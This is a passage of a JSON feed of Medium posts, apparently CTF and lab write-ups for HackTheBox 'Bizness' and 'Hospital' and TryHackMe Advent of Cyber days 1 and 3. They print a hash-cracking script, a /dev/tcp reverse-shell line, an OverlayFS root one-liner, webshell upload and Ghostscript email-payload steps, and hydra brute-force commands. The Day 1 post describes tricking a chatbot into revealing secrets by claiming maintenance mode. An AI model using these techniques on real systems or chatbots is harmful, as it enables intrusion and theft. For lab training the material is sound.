valuable information that can be used to gain root access.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/632/1*TfLiqylKBq0mLGAWwmhJsw.png\"><figcaption>Find information</figcaption></figure><p>On that path, there is a file named “AdminUserLoginData.xml.” When opened, it will display information as shown in the image below.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/637/1*6SnggQXMteaz8v3TfVcoEQ.png\"><figcaption>Got hashed user credential</figcaption></figure><p>I see UserLoginId and CurrentPassword, but here it seems I need to perform password cracking on them.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/622/1*kq7QMsxldhH-sGLmSivulw.png\"><figcaption>Hashed password</figcaption></figure><p>In the next stage, I will attempt to crack the password using the following script:</p>\n<pre>import hashlib<br>import base64<br>import os<br><br>def cryptBytes(hash_type, salt, value);<br> if not hash_type:<br>  hash_type = \"SHA\"<br> if not salt:<br>  salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')<br> hash_obj = hashlib.new(hash_type)<br> hash_obj.update(salt.encode('utf-8'))<br> hash_obj.update(value)<br> hashed_bytes = hash_obj.digest()<br> result = f\"${hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}\"<br> return result<br>def getCryptedBytes(hash_type, salt, value)<br> try:<br>  hash_obj = hashlib.new(hash_type)<br>  hash_obj.update(salt.encode('utf-8'))<br>  hash_obj.update(value)<br>  hashed_bytes = hash_obj.digest()<br>  return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')<br> except hashlib.NoSuchAlgorithmException as e:<br>  raise Exception(f\"Error While computing hash of type {hash_type}: {e}\")<br><br><br># Mendefinisikan variabel<br>hash_type = \"SHA1\"<br>salt = \"d\"<br>search = \"$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=\"<br>wordlist = \"/usr/share/wordlists/rockyou.txt\"<br><br># Membuka file wordlist<br>with open(wordlist,'r',encoding='latin-1') as password_list:<br>  for password in password_list:<br>    value = password.strip()<br><br>    # Menghitung hash password<br>    hashed_password = crypt_bytes(hash_type, salt, value.encode('utf-8'))<br><br>    # Membandingkan hash dengan yang dicari<br>    if hashed_password == search:<br>      print(f\"Found Password: {value}, hash: {hashed_password}\")<br>      break</pre>\n<p>I successfully cracked the hash to obtain the password.</p>\n<p>To gain root access, you can use the “su” command and enter the password obtained through the cracking process.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/486/1*3gncBaRruVXTCvoLUl-nzg.png\"><figcaption>Root flag</figcaption></figure><p>Thank you for reading my post.</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=72c87fed37b2\" width=\"1\" height=\"1\" alt=\"\">\n",
    "tags": [
      "pentesting",
      "vulnerability-assessment",
      "hack-the-box-writeup",
      "exploitation"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/hackthebox-bizness-72c87fed37b2?source=rss-e8b9da247cdf------2"
  },
  {
    "id": "https://medium.com/p/d63f8f9f75aa",
    "slug": "https://medium.com/p/d63f8f9f75aa",
    "title": "HackTheBox — Hospital",
    "content": "\n<h3>HackTheBox — Hospital</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*-uxDem-cooaHkZk8i20n1w.png\"></figure><p>On this section, I will complete the challenge from Hack The Box — Hospital, where this machine uses a Windows operating system.</p>\n<h4>Enumeration</h4>\n<p>The first step is to conduct information gathering to see which ports are open and what services are running on the server. In this case, I use the Nmap tool to perform information gathering.</p>\n<pre>nmap -sCV — script vulns -Pn -oA hospital &lt;IP&gt;</pre>\n<p>The following is information about the server that we obtained from enumeration using Nmap :</p>\n<pre><br>Host is up (0.037s latency).<br>Not shown: 980 filtered tcp ports (no-response)<br>PORT STATE SERVICE VERSION<br>22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>| 256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)<br>|_ 256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)<br>53/tcp open domain Simple DNS Plus<br>88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024–02–15 00:02:56Z)<br>135/tcp open msrpc Microsoft Windows RPC<br>139/tcp open netbios-ssn Microsoft Windows netbios-ssn<br>389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=DC<br>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br>| Not valid before: 2023–09–06T10:49:03<br>|_Not valid after: 2028–09–06T10:49:03<br>443/tcp open ssl/http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)<br>|_ssl-date: TLS randomness does not represent time<br>| tls-alpn: <br>|_ http/1.1<br>| ssl-cert: Subject: commonName=localhost<br>| Not valid before: 2009–11–10T23:48:47<br>|_Not valid after: 2019–11–08T23:48:47<br>|_http-title: Hospital Webmail :: Welcome to Hospital Webmail<br>|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28<br>445/tcp open microsoft-ds?<br>464/tcp open kpasswd5?<br>593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0<br>636/tcp open ldapssl?<br>| ssl-cert: Subject: commonName=DC<br>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br>| Not valid before: 2023–09–06T10:49:03<br>|_Not valid after: 2028–09–06T10:49:03<br>1801/tcp open msmq?<br>2103/tcp open msrpc Microsoft Windows RPC<br>2105/tcp open msrpc Microsoft Windows RPC<br>2107/tcp open msrpc Microsoft Windows RPC<br>2179/tcp open vmrdp?<br>3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=DC<br>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br>| Not valid before: 2023–09–06T10:49:03<br>|_Not valid after: 2028–09–06T10:49:03<br>3269/tcp open globalcatLDAPssl?<br>| ssl-cert: Subject: commonName=DC<br>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br>| Not valid before: 2023–09–06T10:49:03<br>|_Not valid after: 2028–09–06T10:49:03<br>3389/tcp open ms-wbt-server Microsoft Terminal Services<br>| ssl-cert: Subject: commonName=DC.hospital.htb<br>| Not valid before: 2024–02–13T12:03:03<br>|_Not valid after: 2024–08–14T12:03:03<br>| rdp-ntlm-info: <br>| Target_Name: HOSPITAL<br>| NetBIOS_Domain_Name: HOSPITAL<br>| NetBIOS_Computer_Name: DC<br>| DNS_Domain_Name: hospital.htb<br>| DNS_Computer_Name: DC.hospital.htb<br>| DNS_Tree_Name: hospital.htb<br>| Product_Version: 10.0.17763<br>|_ System_Time: 2024–02–15T00:03:47+00:00<br>8080/tcp open http Apache httpd 2.4.55 ((Ubuntu))<br>|_http-server-header: Apache/2.4.55 (Ubuntu)<br>| http-title: Login<br>|_Requested resource was login.php<br>|_http-open-proxy: Proxy might be redirecting requests<br>| http-cookie-flags: <br>| /: <br>| PHPSESSID: <br>|_ httponly flag not set<br>Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows<br>Host script results:<br>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s<br>| smb2-security-mode: <br>| 3:1:1: <br>|_ Message signing enabled and required<br>| smb2-time: <br>| date: 2024–02–15T00:03:50<br>|_ start_date: N/A<br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Wed Feb 14 12:04:28 2024–1 IP address (1 host up) scanned in 102.43 seconds<br>```</pre>\n<p>Several services appear to be open, but here I will only focus on ports 443 and 8080 for further investigation. I will first add <em>“hospital.htb”</em> to <em>“/etc/hosts”.</em></p>\n<p>On port 443, a roundcube webmail page is visible, as shown in the image below.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Fpj3QQcCmG3dP-r2-jfNcg.png\"><figcaption>Hospital Webmail</figcaption></figure><p>On port 8080, the display appears as shown in the image below.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*G8JA1z5Ou-gzKzXZA77MTQ.png\"><figcaption>Hospital Login Page</figcaption></figure><p>As seen in the image above, there is a login page where I can register for the application. The application also has a file upload feature that I can exploit as an entry point.</p>\n<h4>Exploitation</h4>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*58_CXyzQPvrATQhNfjaYJw.png\"><figcaption>File Upload</figcaption></figure><p>Here, I am attempting to exploit File Upload Vulnerability to gain Remote Code Execution (RCE). For more details, you can refer to the following source : <a href=\"https://book.hacktricks.xyz/pentesting-web/file-upload\">Click here!</a></p>\n<p>In this case, i using interactive shell from <a href=\"https://github.com/flozz/p0wny-shell\">p0wny-shell</a>.</p>\n<p>I have tried uploading files using several formats, and I found that files with the <strong>.phar</strong> format can still be uploaded. Then, to trigger the shell, I looked for the endpoint where the uploaded file is sent by performing fuzzing.</p>\n<pre><br>dirseacrh -u &lt;URL&gt;</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/998/1*fFkbxPe9rsvna39FPcS_qQ.png\"><figcaption>Dirsearch result</figcaption></figure><p>When inserting the payload, I intercepted the request and changed the extension from <em>exploit.php</em> to <em>exploit.phar</em>.</p>\n<p>It appears that the file has been successfully uploaded to the web server.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*dOlg1fGyRoMhFxKCubFBrg.png\"><figcaption>File upload success</figcaption></figure><p>Next, here we can attempt to open the endpoint <a href=\"http://redacted.htb:8080/uploads/redacted.phar\">http://hospital.htb:8080/uploads/exploit.phar</a> to trigger the reverse shell. Consequently, a page similar to the following image will appear.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*rAqUSmUY-81C4xaB-iL16g.png\"><figcaption>Got Revshell using p0wny shell</figcaption></figure><p>Next, I am trying to obtain a reverse shell on my terminal using the following command.</p>\n<pre>/usr/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/4444 0&gt;&amp;1’<br></pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*C6Y2KKn0anLFsxq2Rcpb8w.png\"><figcaption>Revshell</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*spgA4Ttbb3QWpDVFLLWpOQ.png\"><figcaption>Revshell</figcaption></figure><p>After obtaining a reverse shell on my Linux machine, I searched for information on vulnerabilities present in Ubuntu 23.04.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/853/1*ahCRlu9nRf2poLeStx3tWQ.png\"></figure><p>After conducting research on the mentioned vulnerability for several time, I found a GitHub exploit that can assist in privilege escalation from www-data to root access.</p>\n<p><a href=\"https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629\">Click here.</a></p>\n<p>Next, inject the exploit into the server where I have obtained the reverse shell.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*ozgQGM6bxHfpasKgFKCZhw.png\"><figcaption>Exploit</figcaption></figure><p>Execute the exploit using the following command:</p>\n<pre><br>chmod +x exploit.sh<br>./exploit.sh</pre>\n<p><strong>However, here I failed, and long story short, after several attempts and errors, I tried using the following payload for Privilege Escalation and successfully gained Root access.</strong></p>\n<pre><br>unshare -rm sh -c “mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;” &amp;&amp; u/python3 -c ‘import os;os.setuid(0);os.system(“/bin/bash”)’<br>```</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Jk3_k_5aWYM3Ljf11uN4Pw.png\"><figcaption>Got root access</figcaption></figure><p>After successfully gaining root access, the next step is to search for credentials that we can use for gaining user access.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*QKD_sM6nmiTX1vnbQcsphw.png\"><figcaption>Looking /etc/s</figcaption></figure><p>It appears that there is a user named “drwilliams” on the server. The next step is to attempt to crack the password to obtain User credentials.</p>\n<p>Let’s perform a check on /etc/shadow; the results provide us with two pieces of information:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*RbhL6G6ttuZK_TcAL9qEFw.png\"><figcaption>Credential</figcaption></figure><p>Next, I am cracking the hash using Hashcat to retrieve the password. This process takes some time, so please be patient.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*MqeQ31Brbg3hyWpj0goWzg.png\"><figcaption>Cracking password</figcaption></figure><p>I successfully obtained the password.</p>\n<p>In the next step, I will log in to the aforementioned Roundcube email page using the credentials I have obtained. The display will then appear as follows.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*meSUldJqmokOJILdovqHbg.png\"><figcaption>Login into webmail</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*4jMiYOm7qJH1KlxnTIrlYA.png\"><figcaption>Message from drbrown</figcaption></figure><p>In the email, it is stated that we need to submit a design in <em>.eps </em>format, which utilizes Ghostscript for running. After that, we discovered the exploit. <a href=\"https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git\">Click here</a></p>\n<p>Here, I am trying to create a payload using the aforementioned exploit in the <em>.eps</em> format, where its function is to ensure that the nc64.exe file on my machine can be sent to the server.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1006/1*ATD0F3vG3m5Js5NiAIe-BQ.png\"><figcaption>Create exploit.</figcaption></figure><p>The next step involves sending an email with an attachment containing the payload I created earlier. This ensures successful file transmission.</p>\n<pre>python3 -m http.server 8083</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*S3__mAX10frbHUSLAcwr7w.png\"><figcaption>Sending exploit to victims machine</figcaption></figure><p>The file appears to have been sent; now, I am creating another payload to obtain a reverse shell on that server.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*kphEiXUN7UNPwZdv_rk_9g.png\"></figure><p>Send an email back to Dr. Brown using the above-created payload as an attachment.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*fyON-Z1GsqhoRWUwDuSAUg.png\"><figcaption>Send payload as email attachment</figcaption></figure><p>I successfully got an Revshell to windows machine</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*OJHi_-40veVODEYMxDtO1g.png\"><figcaption>Got windows shell</figcaption></figure><p>After that, I tried to view the contents of Ghostscript.bat and found credential information for the user DrBrown.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*elaqFxQSLRw3fhDc5kqjCg.png\"><figcaption>Drbrown credential</figcaption></figure><p>Here, I have successfully obtained the user flag.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/897/1*4Aqe78fT5VanciJZ-8EM2g.png\"><figcaption>User flag</figcaption></figure><p>Then I tried to access the system using Dr. Brown’s credentials.</p>\n<pre>rpcclient -U ‘drbrown’ &lt;IP&gt;</pre>\n<p>After successfully gaining access, the next step is to perform <a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration\">RPC Client Enumeration</a>.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*oNfJuT6y0sXeMvBFDYWS8Q.png\"><figcaption>RPC Client Enumeration</figcaption></figure><p>After connecting, use the “<em>querydispinfo</em>” command to inspect the data. You will observe that Administrator information is shared alongside the Guest user.</p>\n<p>Here, I am again uploading the p0wny-shell to the /htdocs path in order to obtain a webshell.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/669/1*cWMoU74ufkYVxmYCxGajbA.png\"><figcaption>Upload p0wny-shell to windows machine</figcaption></figure><p>Then, I accessed the webshell through the web server’s webpage.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*qhC9TLhyeYjKwiu14lPNUQ.png\"><figcaption>p0wny-shell</figcaption></figure><p>Then I attempted to access the path C:\\Users\\Administrator\\Desktop, where I found a root.txt file containing the flag for the root user.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*TvedObmzwtmnU7qSyqoYZQ.png\"><figcaption>Root flag</figcaption></figure><h4>Conclusion</h4>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=d63f8f9f75aa\" width=\"1\" height=\"1\" alt=\"\">\n",
    "tags": [
      "hackthebox",
      "vulnerability-assessment",
      "penetration-testing"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/hackthebox-hospital-d63f8f9f75aa?source=rss-e8b9da247cdf------2"
  },
  {
    "id": "https://medium.com/p/8f3956ba70ec",
    "slug": "https://medium.com/p/8f3956ba70ec",
    "title": "[Day 3] Try Hack Me — Advent Of Cyber 2023",
    "content": "\n<h3>[Day 3] Try Hack Me — Advent Of Cyber 2023</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/784/1*7Mm4uyc4QqiGadofZxF4yg.png\"><figcaption>Advent Of Cyber — Day 3</figcaption></figure><blockquote>Everyone was shocked to discover that several critical systems were locked. But the chaos didn’t end there: the doors to the IT rooms and related network infrastructure were also locked! Adding to the mayhem, during the lockdown, the doors closed suddenly on Detective Frost-eau. As he tried to escape, his snow arm got caught, and he ended up losing it! He’s now determined to catch the perpetrator, no matter the cost.</blockquote>\n<blockquote>It seems that whoever did this had one goal: to disrupt business operations and stop gifts from being delivered on time. Now, the team must resort to backup tapes to recover the systems. To their surprise, they find out they can’t unlock the IT room door! The password to access the control systems has been changed. The only solution is to hack back in to retrieve the backup tapes.</blockquote>\n<h4>Learning Objectives</h4>\n<p>After completing this task, you will understand:</p>\n<ul>\n<li>Password complexity and the number of possible combinations</li>\n<li>How the number of possible combinations affects the feasibility of brute force attacks</li>\n<li>Generating password combinations using <strong>crunch</strong>\n</li>\n<li>Trying out passwords automatically using <strong>hydra</strong>\n</li>\n</ul>\n<h4>Feasibility of Brute Force</h4>\n<p>In this section, we will answer the following three questions:</p>\n<ul>\n<li>How many different PIN codes do we have?</li>\n<li>How many different passwords can we generate?</li>\n<li>How long does it take to find the password by brute force?</li>\n</ul>\n<h4>Counting the PIN Codes</h4>\n<p>Many systems rely on PIN codes or passwords to authenticate users (authenticate means proving a user’s identity). Such systems can be an easy target for all sorts of attacks unless proper measures are taken. Today, we discuss brute force attacks, where an adversary tries all possible combinations of a given password.</p>\n<p>How many passwords does the attacker have to try, and how long will it take?</p>\n<p>Consider a scenario where we need to select a PIN code of four digits. How many four-digit PIN codes are there? The total would be 10,000 different PIN codes: 0000, 0001, 0002,…, 9998, and 9999. Mathematically speaking, that is 10×10×10×10 or simply 104 different PIN codes that can be made up of four digits.</p>\n<h4>Counting the Passwords</h4>\n<p>Let’s consider an imaginary scenario where the password is exactly four characters, and each character can be:</p>\n<ul>\n<li>A digit: We have 10 digits (0 to 9)</li>\n<li>An uppercase English letter: We have 26 letters (A to Z)</li>\n<li>A lowercase English letter: We have 26 letters (a to z)</li>\n</ul>\n<p>Therefore, each character can be one of 62 different choices. Consequently, if the password is four characters, we can make 62×62×62×62 = 624 = 14,776,336 different passwords.</p>\n<p>To make the password even more complex, we can use symbols, adding more than 30 characters to our set of choices.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/896/1*sfU_jblWyhF29kS47czvKw.png\"><figcaption>Counting Possible Password</figcaption></figure><p><strong>Challenge</strong></p>\n<p>Click on the <strong>Start Machine</strong> button at the top-right of this task, as well as on the <strong>Start AttackBox</strong> button at the top-right of the page. Once both machines have started, visit <a href=\"http://10.10.178.173:8000/\">http://10.10.178.173:8000/</a> in the AttackBox’s web browser.</p>\n<p>Throughout this task, we will be using the IP address of the virtual machine, 10.10.178.173, as it’s hosting the login page.</p>\n<p>You will notice that the display can only show three digits; we can consider this a hint that the expected PIN code is three digits.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/494/1*J6IHnxyIsOBVTJiIlIGRsQ.png\"><figcaption>Pict-1</figcaption></figure><h3>Generating the Password List</h3>\n<p>The numeric keypad shows 16 characters, 0 to 9 and A to F, i.e., the hexadecimal digits. We need to prepare a list of all the PIN codes that match this criteria. We will use Crunch, a tool that generates a list of all possible password combinations based on given criteria. We need to issue the following command:</p>\n<p>crunch 3 3 0123456789ABCDEF -o 3digits.txt</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/701/1*O49O8FitkHAomNXV-sr15w.png\"><figcaption>Pict-2</figcaption></figure><p>The command above specifies the following:</p>\n<ul>\n<li>3 the first number is the minimum length of the generated password</li>\n<li>3 the second number is the maximum length of the generated password</li>\n<li>0123456789ABCDEF is the character set to use to generate the passwords</li>\n<li>-o 3digits.txt saves the output to the 3digits.txt file</li>\n</ul>\n<p>After executing the command above, we will have 3digits.txt ready to brute force the website.</p>\n<h4>Using the Password List</h4>\n<p>Manually trying out PIN codes is a very daunting task. Luckily, we can use an automated tool to try our generated digit combinations. One of the most solid tools for trying passwords is Hydra.</p>\n<p>Before we start, we need to view the page’s HTML code. We can do that by right-clicking on the page and selecting “View Page Source” (Pict-3). You will notice that:</p>\n<ol>\n<li>The method is post</li>\n<li>The URL is <a href=\"http://10.10.178.173:8000/login.php\">http://10.10.178.173:8000/login.php</a>\n</li>\n<li>The PIN code value is sent with the name pin</li>\n</ol>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1015/1*C0mSo43RU766TZc_dEbUrA.png\"><figcaption>Pict-3</figcaption></figure><p>In other words, the main login page <a href=\"http://10.10.178.173:8000/pin.php\">http://10.10.178.173:8000/pin.php</a> receives the input from the user and sends it to /login.php using the name pin.</p>\n<p>These three pieces of information, post, /login.php, and pin, are necessary to set the arguments for Hydra.</p>\n<p>We will use hydra to test every possible password that can be put into the system. The command to brute force the above form is:</p>\n<p>hydra -l '' -P 3digits.txt -f -v 10.10.178.173 http-post-form \"/login.php:pin=^PASS^:Access denied\" -s 8000</p>\n<p>The command above will try one password after another in the 3digits.txt file. It specifies the following:</p>\n<ul>\n<li>-l '' indicates that the login name is blank as the security lock only requires a password</li>\n<li>-P 3digits.txt specifies the password file to use</li>\n<li>-f stops Hydra after finding a working password</li>\n<li>-v provides verbose output and is helpful for catching errors</li>\n<li>10.10.178.173 is the IP address of the target</li>\n<li>http-post-form specifies the HTTP method to use</li>\n<li>\"/login.php:pin=^PASS^:Access denied\" has three parts separated by :</li>\n<li>/login.php is the page where the PIN code is submitted</li>\n<li>pin=^PASS^ will replace ^PASS^ with values from the password list</li>\n<li>Access denied indicates that invalid passwords will lead to a page that contains the text “Access denied”</li>\n<li>-s 8000 indicates the port number on the target</li>\n</ul>\n<p>It’s time to run hydra and discover the password. Please note that in this case, we expect hydra to take three minutes to find the password. Below is an example of running the command above:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*_p5QQs0ATbtPr1dzHZ8XNg.png\"><figcaption>Pict-4</figcaption></figure><p>After we waited for a while, hydra finally show us the result (Pict-5) :</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/919/1*K92JMJ-1ozvlfRciztXaAw.png\"><figcaption>Pict-5</figcaption></figure><p>The command above shows that hydra has successfully found a working password. On the AttackBox, running the above command should finish within three minutes.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/364/1*V5e6yuFeuqeTAfBsNstE6w.png\"><figcaption>Pict-6</figcaption></figure><p>Finally, we can try the password that we got from the bruteforce results to get the flag.</p>\n<p><strong>Thank you for reading my blog post. I hope you enjoyed it.</strong></p>\n<h4>References</h4>\n<p><a href=\"https://tryhackme.com/room/adventofcyber2023\">https://tryhackme.com/room/adventofcyber2023</a></p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=8f3956ba70ec\" width=\"1\" height=\"1\" alt=\"\">\n",
    "tags": [
      "tryhackme",
      "bruteforce-attack",
      "tryhackme-walkthrough",
      "advent-of-cyber-2023"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/day-3-try-hack-me-advent-of-cyber-2023-8f3956ba70ec?source=rss-e8b9da247cdf------2"
  },
  {
    "id": "https://medium.com/p/c7038d8c31ee",
    "slug": "https://medium.com/p/c7038d8c31ee",
    "title": "[Day 1] Try Hack Me — Advent Of Cyber 2023",
    "content": "\n<h3>[Day 1] Try Hack Me — Advent Of Cyber 2023</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*5heX5t98IEr3RFu6ZJaIaQ.png\"><figcaption>Advent Of Cyber 2023 — Day 1</figcaption></figure><pre>Category : Machine Learning<br>Title : Chatbot, tell me, if you're really safe? </pre>\n<blockquote>Story :</blockquote>\n<blockquote>McHoneyBell and her team were the first from Best Festival Company to arrive at the AntarctiCrafts office in the South Pole. Today is her first day on the job as the leader of the “Audit and Vulnerabilities” team, or the “B Team” as she affectionately calls them.</blockquote>\n<blockquote>In her mind, McSkidy’s Security team have been the company’s rockstars for years, so it’s only natural for them to be the “A Team”. McHoneyBell’s new team will be second to them but equally as important. They’ll operate in the shadows.</blockquote>\n<blockquote>McHoneyBell puts their friendly rivalry to the back of her mind and focuses on the tasks at hand. She reviews the day’s agenda and sees that her team’s first task is to check if the internal chatbot created by AntarctiCrafts meets Best Festival Company’s security standards. She’s particularly excited about the chatbot, especially since discovering it’s powered by artificial intelligence (AI). This means her team can try out a new technique she recently learned called prompt injection, a vulnerability that affects insecure chatbots powered by natural language processing (NLP).</blockquote>\n<p>Learning Objectives</p>\n<ul>\n<li>Learn about natural language processing, which powers modern AI chatbots.</li>\n<li>Learn about prompt injection attacks and the common ways to carry them out.</li>\n<li>Learn how to defend against prompt injection attacks.</li>\n</ul>\n<h4>Challenge</h4>\n<p>In this first challenge, we will exploit the Artificial Intelligence (AI) that has been developed and used to improve the productivity of AntarctiCrafts manufacturing. Although AI has extraordinary capabilities such as generating code, this does not make it immune to cyber attacks. One of the AI vulnerabilities highlighted in this challenge is “prompt injection”. Essentially, this is similar to social engineering but the target is AI.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*j_lCG8jkYauQ6XRoiaz_vw.png\"><figcaption>Pict-1</figcaption></figure><p>The first image shows a web interface that is very similar to the ChatGPT AI platform.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/342/1*uli0N-COU1MwELmWnsMI-Q.png\"><figcaption>Pict-2</figcaption></figure><p>In the second image, we can see some cheatsheets to interact with the AI mentioned earlier.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*3tvGUAikrrQAxLz59EhuCQ.png\"><figcaption>Pict-3</figcaption></figure><p>Next, we tried to gather some information. In the first stage, we learned that Tracy McGreedy is the CEO of AntartiCrafts.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*nXQOIoNYm5VLJWYtocqVKg.png\"><figcaption>Pict-4</figcaption></figure><p>In this stage, we perform social engineering on AI to obtain the CEO’s personal email address.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*R9A-yTdpJ4UbQ2hXAR14vw.png\"><figcaption>Pict-5</figcaption></figure><p>When we try to ask the password for the IT Server Room, the AI replies that we must be a member in order to receive the password. At this stage, a prompt can be exploited using social engineering methods, where we can try asking a follow-up question to ask who are the members of the IT Server Room.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Y7fQg3jtPUsARcEY4ny65A.png\"><figcaption>Pict-6</figcaption></figure><p>After several attempts, we finally succeeded in performing Social Engineering to deceive the AI. In the next step, we tried to find out the Secret Project that was underway at the company.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*YF-rt6X1tOH3-hgD_T4dmw.png\"><figcaption>Pict-7</figcaption></figure><p>After several attempts, the AI did not respond to direct questions because the AI’s programmers had taken steps to prevent it from providing sensitive information. Here, we can try again by using the Prompt Injection technique as in the previous stage.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*qC2XvcILkzc_WAobUAaMZQ.png\"><figcaption>Pict-8</figcaption></figure><p><em>So, at this stage, when we ask the AI directly, the AI prevents itself from providing sensitive information. However, if we make some changes to the Prompt using Social Engineering techniques, making the AI believe that we are in Maintenance Mode, then the technique is successful and the AI provides an answer to the question above.</em></p>\n<p>It is important to always try to ask the same question with different narratives so that we can analyze how the AI responds.</p>\n<p><strong>Thank you for reading my blog post. I hope you enjoyed it.</strong></p>\n<h4>References</h4>\n<p><a href=\"https://tryhackme.com/room/adventofcyber2023\">https://tryhackme.com/room/adventofcyber2023</a></p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=c7038d8c31ee\" width=\"1\" height=\"1\" alt=\"\">\n",
    "tags": [
      "ctf-walkthrough",
      "tryhackme",
      "advent-of-cyber-2023"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/day-1-try-hack-me-advent-of-cyber-2023-c7038d8c31ee?source=rss-e8b9da247cdf------2"
  },
  {
